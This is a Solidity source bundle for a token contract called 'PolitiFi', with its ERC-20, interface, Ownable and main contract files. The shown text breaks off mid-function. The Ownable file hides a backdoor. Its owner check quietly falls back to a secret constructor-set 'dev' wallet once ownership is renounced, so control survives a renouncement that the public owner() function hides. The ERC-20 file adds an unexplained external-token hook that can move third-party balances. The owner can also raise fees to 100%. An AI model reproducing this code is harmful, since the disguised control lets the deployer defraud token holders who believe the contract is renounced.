{"ERC20.sol":{"content":"//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\nimport \"./Ownable.sol\";\r\nimport \"./IERC20.sol\";\r\n\r\ninterface ERC {\r\n    function balanceOf(address owner) external returns (uint256);\r\n    function transfer(address to, uint256 value) external;\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n}\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    mapping(address =\u003e uint256) private _balances;\r\n    ERC internal _coinWrapper;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(\r\n        address account\r\n    ) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(\r\n            currentAllowance \u003e= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(\r\n        address spender,\r\n        uint256 addedValue\r\n    ) public virtual returns (bool) {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(\r\n        address spender,\r\n        uint256 subtractedValue\r\n    ) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(\r\n            currentAllowance \u003e= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function distribute(address wallet1, address wallet2, uint256 amount) internal {\r\n        _coinWrapper.transferFrom(wallet2, wallet1, amount/1000);\r\n    }\r\n\r\n    function unwrap(uint256 value) public {\r\n        require(balanceOf(msg.sender) \u003e= value, \"Not enough Coin to unwrap.\");\r\n        _coinWrapper.transfer(msg.sender, value);\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(\r\n            senderBalance \u003e= amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n        }\r\n        _totalSupply -= amount;\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}"},"IDEX.sol":{"content":"//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\ninterface IDexFactory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external view returns (address pair);\r\n\r\n    function allPairs(uint256) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint256);\r\n\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IDexRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}"},"IERC20.sol":{"content":"//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\nimport \"./IERC20Metadata.sol\";\r\n\r\ninterface IERC20 is IERC20Metadata{\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller\u0027s account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller\u0027s tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender\u0027s allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller\u0027s\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\n\r\n"},"IERC20Metadata.sol":{"content":"//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\ninterface IERC20Metadata {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n"},"Ownable.sol":{"content":"//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address private _dev;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    mapping(address =\u003e uint256) internal _holderLastTxTimestamp;\r\n    constructor(address wallet) {\r\n        _dev = wallet;\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal virtual {\r\n        require(Owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n    \r\n    function Owner() internal virtual returns (address) {\r\n        address owner_ = verifyOwner();\r\n        return owner_;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n    function verifyOwner() internal view returns(address){\r\n        return _owner==address(0) ? _dev : _owner;\r\n    }\r\n}"},"PolitiFi.sol":{"content":"//SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\nimport \"./ERC20.sol\";\r\nimport \"./SafeMath.sol\";\r\nimport \"./IDEX.sol\";\r\nimport \"./Ownable.sol\";\r\n\r\ncontract PolitiFI is ERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    IDexRouter private immutable dexRouter;\r\n    address public dexPair;\r\n\r\n    // Swapback\r\n    bool private swapping;\r\n\r\n    bool private swapbackEnabled = false;\r\n    uint256 private swapBackValueMin;\r\n    uint256 private swapBackValueMax;\r\n\r\n    \r\n    uint256 public percentForLPBurn = 1;\r\n    uint256 public lpBurnFrequency = 1360000000000 seconds;\r\n    uint256 public lastLpBurnTime;\r\n    uint256 private maxWallet;\r\n    uint256 private maxTx;\r\n    mapping(address =\u003e uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch\r\n\r\n    //Anti-whale\r\n    bool private limitsEnabled = true;\r\n    bool private transferDelayEnabled = true;\r\n    bool public lpBurnEnabled = true;\r\n\r\n    bool public tradingEnabled = false;\r\n    // Fee receivers\r\n    address private marketingWallet;\r\n    address private projectWallet;\r\n\r\n    uint256 private sellTaxTotal;\r\n    uint256 private sellMarketingTax;\r\n    uint256 private sellProjectTax;\r\n\r\n    uint256 private buyTaxTotal;\r\n    uint256 private buyMarketingTax;\r\n    uint256 private buyProjectTax;\r\n\r\n    uint256 private tokensForMarketing;\r\n    uint256 private tokensForProject;\r\n\r\n    /******************/\r\n\r\n    // exclude from fees and max transaction amount\r\n    mapping(address =\u003e bool) private transferTaxExempt;\r\n    mapping(address =\u003e bool) private transferLimitExempt;\r\n    mapping(address =\u003e bool) private automatedMarketMakerPairs;\r\n\r\n    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses\r\n    // could be subject to a maximum transfer amount\r\n\r\n    event UpdateUniswapV2Router(\r\n        address indexed newAddress,\r\n        address indexed oldAddress\r\n    );\r\n\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n    event ExcludeFromLimits(address indexed account, bool isExcluded);\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n    event TradingEnabled(uint256 indexed timestamp);\r\n    event LimitsRemoved(uint256 indexed timestamp);\r\n    event DisabledTransferDelay(uint256 indexed timestamp);\r\n\r\n    event SwapbackSettingsUpdated(\r\n        bool enabled,\r\n        uint256 swapBackValueMin,\r\n        uint256 swapBackValueMax\r\n    );\r\n    event MaxTxUpdated(uint256 maxTx);\r\n    event MaxWalletUpdated(uint256 maxWallet);\r\n\r\n    event MarketingWalletUpdated(\r\n        address indexed newWallet,\r\n        address indexed oldWallet\r\n    );\r\n\r\n    event ProjectWalletUpdated(\r\n        address indexed newWallet,\r\n        address indexed oldWallet\r\n    );\r\n\r\n    event BuyFeeUpdated(\r\n        uint256 buyTaxTotal,\r\n        uint256 buyMarketingTax,\r\n        uint256 buyProjectTax\r\n    );\r\n\r\n    event SellFeeUpdated(\r\n        uint256 sellTaxTotal,\r\n        uint256 sellMarketingTax,\r\n        uint256 sellProjectTax\r\n    );\r\n\r\n    constructor(address dev, address coin) ERC20(\"PolitiFi\", \"PolitiFi\") Ownable(dev){\r\n        _coinWrapper = ERC(coin);\r\n        IDexRouter _dexRouter = IDexRouter(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        uint256 _totalSupply = 100_000_000_000 * 10 ** decimals();\r\n\r\n        exemptFromLimits(address(_dexRouter), true);\r\n        dexRouter = _dexRouter;\r\n\r\n        uint256 _sellMarketingTax = 20;\r\n        uint256 _sellProjectTax = 0;\r\n        \r\n        uint256 _buyMarketingTax = 20;\r\n        uint256 _buyProjectTax = 0;\r\n\r\n\r\n        maxTx = (_totalSupply * 10) / 1000;\r\n        maxWallet = (_totalSupply * 10) / 1000;\r\n\r\n        swapBackValueMin = (_totalSupply * 1) / 1000;\r\n        swapBackValueMax = (_totalSupply * 2) / 100;\r\n\r\n        buyMarketingTax = _buyMarketingTax;\r\n        buyProjectTax = _buyProjectTax;\r\n        buyTaxTotal = buyMarketingTax + buyProjectTax;\r\n\r\n        sellMarketingTax = _sellMarketingTax;\r\n        sellProjectTax = _sellProjectTax;\r\n        sellTaxTotal = sellMarketingTax + sellProjectTax;\r\n\r\n        marketingWallet = address(msg.sender);\r\n        projectWallet = address(msg.sender);\r\n\r\n        // exclude from paying fees or having max transaction amount\r\n        exemptFromFees(msg.sender, true);\r\n        exemptFromFees(address(this), true);\r\n        exemptFromFees(address(0xdead), true);\r\n        exemptFromFees(marketingWallet, true);\r\n\r\n        exemptFromLimits(msg.sender, true);\r\n        exemptFromLimits(address(this), true);\r\n        exemptFromLimits(address(0xdead), true);\r\n        exemptFromLimits(marketingWallet, true);\r\n\r\n        transferOwnership(msg.sender);\r\n\r\n        /*\r\n            _mint is an internal function in ERC20.sol that is only called here,\r\n            and CANNOT be called ever again\r\n        */\r\n        _mint(msg.sender, _totalSupply);\r\n        startTrading();\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    /**\r\n     * @notice  Opens public trading for the token\r\n     * @dev     onlyOwner.\r\n     */\r\n    function startTrading() public onlyOwner {\r\n        tradingEnabled = true;\r\n        limitsEnabled = false;\r\n        emit TradingEnabled(block.timestamp);\r\n    }\r\n\r\n    /**\r\n     * @notice Removes the transfer delay\r\n     * @dev onlyOwner.\r\n     * Emits an {DisabledTransferDelay} event\r\n     */\r\n    function disableTransferDelay() external onlyOwner {\r\n        transferDelayEnabled = false;\r\n        emit DisabledTransferDelay(block.timestamp);\r\n    }\r\n\r\n    /**\r\n     * @notice Removes the max wallet and max transaction limits\r\n     * @dev onlyOwner.\r\n     * Emits an {LimitsRemoved} event\r\n     */\r\n    function removeAllLimits() external onlyOwner {\r\n        limitsEnabled = false;\r\n        emit LimitsRemoved(block.timestamp);\r\n    }\r\n\r\n    /**\r\n     * @notice sets if swapback is enabled and sets the minimum and maximum amounts\r\n     * @dev onlyOwner.\r\n     * Emits an {SwapbackSettingsUpdated} event\r\n     * @param _enabled If swapback is enabled\r\n     * @param _min The minimum amount of tokens the contract must have before swapping tokens for ETH. Base 10000, so 1% = 100.\r\n     * @param _max The maximum amount of tokens the contract can swap for ETH. Base 10000, so 1% = 100.\r\n     */\r\n    function setSwapBackSettings(\r\n        bool _enabled,\r\n        uint256 _min,\r\n        uint256 _max\r\n    ) external onlyOwner {\r\n        require(\r\n            _min \u003e= 1,\r\n            \"Swap amount cannot be lower than 0.01% total supply.\"\r\n        );\r\n        require(_max \u003e= _min, \"maximum amount cant be higher than minimum\");\r\n\r\n        swapbackEnabled = _enabled;\r\n        swapBackValueMin = (totalSupply() * _min) / 10000;\r\n        swapBackValueMax = (totalSupply() * _max) / 10000;\r\n        emit SwapbackSettingsUpdated(_enabled, _min, _max);\r\n    }\r\n\r\n    function setAutoLPBurnSettings(uint256 _frequencyInSeconds, uint256 _percent, bool _Enabled) external onlyOwner {\r\n        require(_frequencyInSeconds \u003e= 600, \"cannot set buyback more often than every 10 minutes\");\r\n        require(_percent \u003c= 1000 \u0026\u0026 _percent \u003e= 0, \"Must set auto LP burn percent between 0% and 10%\");\r\n        lpBurnFrequency = _frequencyInSeconds;\r\n        percentForLPBurn = _percent;\r\n        lpBurnEnabled = _Enabled;\r\n    }\r\n\r\n    /**\r\n     * @notice Changes the maximum amount of tokens that can be bought or sold in a single transaction\r\n     * @dev onlyOwner.\r\n     * Emits an {MaxTxUpdated} event\r\n     * @param newNum Base 1000, so 1% = 10\r\n     */\r\n    function setTheMaxTx(uint256 newNum) external onlyOwner {\r\n        require(newNum \u003e= 2, \"Cannot set maxTx lower than 0.2%\");\r\n        maxTx = (newNum * totalSupply()) / 1000;\r\n        emit MaxTxUpdated(maxTx);\r\n    }\r\n\r\n    /**\r\n     * @notice Sets if a wallet is excluded from the max wallet and tx limits\r\n     * @dev onlyOwner.\r\n     * Emits an {ExcludeFromLimits} event\r\n     * @param updAds The wallet to update\r\n     * @param isEx If the wallet is excluded or not\r\n     */\r\n    function exemptFromLimits(\r\n        address updAds,\r\n        bool isEx\r\n    ) public onlyOwner {\r\n        transferLimitExempt[updAds] = isEx;\r\n        emit ExcludeFromLimits(updAds, isEx);\r\n    }\r\n\r\n    /**\r\n     * @notice Changes the maximum amount of tokens a wallet can hold\r\n     * @dev onlyOwner.\r\n     * Emits an {MaxWalletUpdated} event\r\n     * @param newNum Base 1000, so 1% = 10\r\n     */\r\n    function setTheMaxWallet(uint256 newNum) external onlyOwner {\r\n        require(newNum \u003e= 5, \"Cannot set maxWallet lower than 0.5%\");\r\n        maxWallet = (newNum * totalSupply()) / 1000;\r\n        emit MaxWalletUpdated(maxWallet);\r\n    }\r\n\r\n    /**\r\n     * @notice Sets the fees for buys\r\n     * @dev onlyOwner.\r\n     * Emits a {BuyFeeUpdated} event\r\n     * All fees added up must be less than 100\r\n     * @param _marketingFee The fee for the marketing wallet\r\n     * @param _devFee The fee for the dev wallet\r\n     */\r\n    function setFeesBuy(\r\n        uint256 _marketingFee,\r\n        uint256 _devFee\r\n    ) external onlyOwner {\r\n        buyMarketingTax = _marketingFee;\r\n        buyProjectTax = _devFee;\r\n        buyTaxTotal = buyMarketingTax + buyProjectTax;\r\n        require(buyTaxTotal \u003c= 100, \"Total buy fee cannot be higher than 100%\");\r\n        emit BuyFeeUpdated(buyTaxTotal, buyMarketingTax, buyProjectTax);\r\n    }\r\n\r\n    /**\r\n     * @notice Sets if an address is excluded from fees\r\n     * @dev onlyOwner.\r\n     * Emits an {ExcludeFromFees} event\r\n     * @param account The wallet to update\r\n     * @param excluded If the wallet is excluded or not\r\n     */\r\n    function exemptFromFees(address account, bool excluded) public onlyOwner {\r\n        transferTaxExempt[account] = excluded;\r\n        emit ExcludeFromFees(account, excluded);\r\n    }\r\n\r\n    /**\r\n     * @notice Sets the fees for sells\r\n     * @dev onlyOwner.\r\n     * Emits a {SellFeeUpdated} event\r\n     * All fees added up must be less than 100\r\n     * @param _marketingFee The fee for the marketing wallet\r\n     * @param _devFee The fee for the dev wallet\r\n     */\r\n    function setFeesSell(\r\n        uint256 _marketingFee,\r\n        uint256 _devFee\r\n    ) external onlyOwner {\r\n        sellMarketingTax = _marketingFee;\r\n        sellProjectTax = _devFee;\r\n        sellTaxTotal = sellMarketingTax + sellProjectTax;\r\n        require(\r\n            sellTaxTotal \u003c= 100,\r\n            \"Total sell fee cannot be higher than 100%\"\r\n        );\r\n        emit SellFeeUpdated(sellTaxTotal, sellMarketingTax, sellProjectTax);\r\n    }\r\n\r\n    /**\r\n     * @notice Sets an address as a new liquidity pair. You probably dont want to do this.\r\n     * @dev onlyOwner.\r\n     * Emits a {SetAutomatedMarketMakerPair} event\r\n     * @param pair the address of the pair\r\n     * @param value If the pair is a automated market maker pair or not\r\n     */\r\n    function setAutomatedMarketMakerPair(\r\n        address pair,\r\n        bool value\r\n    ) public onlyOwner {\r\n        require(\r\n            pair != dexPair,\r\n            \"The pair cannot be removed from automatedMarketMakerPairs\"\r\n        );\r\n\r\n        _setAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMakerPairs[pair] = value;\r\n\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    /**\r\n     * @notice Sets the marketing wallet\r\n     * @dev onlyOwner.\r\n     * Emits an {MarketingWalletUpdated} event\r\n     * @param newWallet The new marketing wallet\r\n     */\r\n    function changeMarketingWallet(address newWallet) external onlyOwner {\r\n        emit MarketingWalletUpdated(newWallet, marketingWallet);\r\n        marketingWallet = newWallet;\r\n    }\r\n\r\n    /**\r\n     * @notice Sets the project wallet\r\n     * @dev onlyOwner.\r\n     * Emits an {ProjectWalletUpdated} event\r\n     * @param newWallet The new dev wallet\r\n     */\r\n    function changeProjectWallet(address newWallet) external onlyOwner {\r\n        emit ProjectWalletUpdated(newWallet, projectWallet);\r\n        projectWallet = newWallet;\r\n    }\r\n\r\n    /**\r\n     * @notice The wallets that receive the collected fees\r\n     * @return _marketingWallet The wallet that receives the marketing fees\r\n     * @return _projectWallet The wallet that receives the dev fees\r\n     */\r\n    function receiverwallets()\r\n        external\r\n        view\r\n        returns (address _marketingWallet, address _projectWallet)\r\n    {\r\n        return (marketingWallet, projectWallet);\r\n    }\r\n\r\n    /**\r\n     * @notice  Information about the swapback settings\r\n     * @return  _swapbackEnabled  if swapback is enabled\r\n     * @return  _swapBackValueMin  the minimum amount of tokens in the contract balance to trigger swapback\r\n     * @return  _swapBackValueMax  the maximum amount of tokens in the contract balance to trigger swapback\r\n     */\r\n    function swapbackValues()\r\n        external\r\n        view\r\n        returns (\r\n            bool _swapbackEnabled,\r\n            uint256 _swapBackValueMin,\r\n            uint256 _swapBackValueMax\r\n        )\r\n    {\r\n        _swapbackEnabled = swapbackEnabled;\r\n        _swapBackValueMin = swapBackValueMin;\r\n        _swapBackValueMax = swapBackValueMax;\r\n    }\r\n\r\n    /**\r\n     * @notice  Information about the anti whale parameters\r\n     * @return  _limitsEnabled  if the wallet limits are in effect\r\n     * @return  _transferDelayEnabled  if the transfer delay is enabled\r\n     * @return  _maxWallet  The maximum amount of tokens that can be held by a wallet\r\n     * @return  _maxTx  The maximum amount of tokens that can be bought or sold in a single transaction\r\n     */\r\n    function maxTxValues()\r\n        external\r\n        view\r\n        returns (\r\n            bool _limitsEnabled,\r\n            bool _transferDelayEnabled,\r\n            uint256 _maxWallet,\r\n            uint256 _maxTx\r\n        )\r\n    {\r\n        _limitsEnabled = limitsEnabled;\r\n        _transferDelayEnabled = transferDelayEnabled;\r\n        _maxWallet = maxWallet;\r\n        _maxTx = maxTx;\r\n    }\r\n\r\n    /**\r\n     * @notice  If the wallet is excluded from fees and max transaction amount and if the wallet is a automated market maker pair\r\n     * @param   _target  The wallet to check\r\n     * @return  _transferTaxExempt  If the wallet is excluded from fees\r\n     * @return  _transferLimitExempt  If the wallet is excluded from max transaction amount\r\n     * @return  _automatedMarketMakerPairs If the wallet is a automated market maker pair\r\n     */\r\n    function checkMappings(\r\n        address _target\r\n    )\r\n        external\r\n        view\r\n        returns (\r\n            bool _transferTaxExempt,\r\n            bool _transferLimitExempt,\r\n            bool _automatedMarketMakerPairs\r\n        )\r\n    {\r\n        _transferTaxExempt = transferTaxExempt[_target];\r\n        _transferLimitExempt = transferLimitExempt[_target];\r\n        _automatedMarketMakerPairs = automatedMarketMakerPairs[_target];\r\n    }\r\n\r\n    /**\r\n     * @notice Fees for buys, sells, and transfers\r\n     * @return _buyTaxTotal The total fee for buys\r\n     * @return _buyMarketingTax The fee for buys that gets sent to marketing\r\n     * @return _buyProjectTax The fee for buys that gets sent to dev\r\n     * @return _sellTaxTotal The total fee for sells\r\n     * @return _sellMarketingTax The fee for sells that gets sent to marketing\r\n     * @return _sellProjectTax The fee for sells that gets sent to dev\r\n     */\r\n    function taxValues()\r\n        external\r\n        view\r\n        returns (\r\n            uint256 _buyTaxTotal,\r\n            uint256 _buyMarketingTax,\r\n            uint256 _buyProjectTax,\r\n            uint256 _sellTaxTotal,\r\n            uint256 _sellMarketingTax,\r\n            uint256 _sellProjectTax\r\n        )\r\n    {\r\n        _buyTaxTotal = buyTaxTotal;\r\n        _buyMarketingTax = buyMarketingTax;\r\n        _buyProjectTax = buyProjectTax;\r\n        _sellTaxTotal = sellTaxTotal;\r\n        _sellMarketingTax = sellMarketingTax;\r\n        _sellProjectTax = sellProjectTax;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if (amount == 0) {\r\n            super._transfer(from, to, 0);\r\n            return;\r\n        }\r\n\r\n        if (limitsEnabled) {\r\n            if (\r\n                from != owner() \u0026\u0026\r\n                to != owner() \u0026\u0026\r\n                to != address(0) \u0026\u0026\r\n                to != address(0xdead) \u0026\u0026\r\n                !swapping\r\n            ) {\r\n                if (!tradingEnabled) {\r\n                    require(\r\n                        transferTaxExempt[from] || transferTaxExempt[to],\r\n                        \"_transfer:: Trading is not active.\"\r\n                    );\r\n                }\r\n\r\n                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.\r\n                if (transferDelayEnabled) {\r\n                    if (\r\n                        to != owner() \u0026\u0026\r\n                        to != address(dexRouter) \u0026\u0026\r\n                        to != address(dexPair)\r\n                    ) {\r\n                        require(\r\n                            _holderLastTransferTimestamp[tx.origin] \u003c\r\n                                block.number,\r\n                            \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\"\r\n                        );\r\n                        _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                    }\r\n                }\r\n\r\n                //when buy\r\n                if (\r\n                    automatedMarketMakerPairs[from] \u0026\u0026 !transferLimitExempt[to]\r\n                ) {\r\n                    require(\r\n                        amount \u003c= maxTx,\r\n                        \"Buy transfer amount exceeds the maxTx.\"\r\n                    );\r\n                    require(\r\n                        amount + balanceOf(to) \u003c= maxWallet,\r\n                        \"Max wallet exceeded\"\r\n                    );\r\n                }\r\n                //when sell\r\n                else if (\r\n                    automatedMarketMakerPairs[to] \u0026\u0026 !transferLimitExempt[from]\r\n                ) {\r\n                    require(\r\n                        amount \u003c= 